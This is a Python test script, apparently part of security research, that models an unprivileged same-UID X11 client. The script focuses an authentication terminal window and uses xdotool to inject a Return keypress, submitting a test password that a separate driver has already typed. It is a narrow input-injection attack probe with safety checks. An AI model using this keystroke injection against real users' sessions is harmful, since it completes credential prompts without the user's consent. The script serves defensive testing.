#!/usr/bin/env python3
"""Same-X11-UID *unprivileged* input-origin negative probe for #59.

Receives only disposable X11 xterm window ID and UI process PID; no PAM
password, application address, authorization token, or root service API.
Injects ONLY the Return key into the already-focused auth terminal. The
separate driver must have typed a generated test password but not Return.
This models unauthorized completion of a credential challenge at a specific
input boundary; it does not establish a full malicious command or GUI exploit.
"""
from __future__ import annotations

import os
from pathlib import Path
import subprocess
import sys


def main(window: str, ui_pid: int) -> None:
    if sys.platform != "linux" or os.geteuid() == 0:
        raise AssertionError("needs unprivileged Linux X11 attacker")
    if not os.environ.get("DISPLAY"):
        raise AssertionError("X11 display missing")
    if not window.isdecimal() or int(window) <= 0 or ui_pid <= 1:
        raise AssertionError("invalid research-only GUI target")
    own = Path("/proc/self/status").read_text()
    ui = Path(f"/proc/{ui_pid}/status").read_text()
    def field(doc: str, key: str) -> str:
        return next(x.split(":", 1)[1].strip() for x in doc.splitlines()
                    if x.startswith(key + ":"))
    if int(field(own, "CapEff"), 16) or int(field(ui, "CapEff"), 16):
        raise AssertionError("test X11 client or GUI has unexpected capabilities")
    if int(field(ui, "Uid").split()[1]) != os.geteuid():
        raise AssertionError("attacker and auth-terminal UI must share OS UID")
    if ui_pid == os.getpid():
        raise AssertionError("attacker must be separate from GUI process")
    for cmd in (["xdotool", "windowfocus", "--sync", window],
                ["xdotool", "key", "--clearmodifiers", "Return"]):
        p = subprocess.run(cmd, input="", capture_output=True, text=True,
                           cwd="/tmp", timeout=7, check=False)
        if p.returncode:
            raise AssertionError(
                f"X11 input-origin attack failed rc={p.returncode}: {p.stderr[-300:]}"
            )
    print("RESEARCH_M59_X11_INDEPENDENT_SAME_UID_INJECTED_AUTH_SUBMIT",
          flush=True)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        raise SystemExit("usage: attacker.py <disposable-x11-window> <xterm-pid>")
    main(sys.argv[1], int(sys.argv[2]))
